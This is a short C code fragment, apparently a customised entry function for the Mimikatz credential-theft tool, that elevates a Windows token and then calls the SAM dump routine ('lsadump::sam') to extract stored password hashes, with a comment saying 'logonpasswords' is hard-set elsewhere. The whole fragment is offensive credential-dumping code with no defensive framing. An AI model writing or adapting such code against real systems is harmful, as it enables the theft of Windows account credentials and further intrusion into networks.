...
void mimikatz_begin()
{
	...
	kuhl_m_token_elevate(0, "token::elevate"); // Required for SAM
	kuhl_m_lsadump_sam(0, 0, "lsadump::sam");
	//imikatz_doLocal("DATADATADATA"); // this doesn't matter, as the "logonpasswords" is hardset within the mimikatz_dolocal function
	mimikatz_end();
}
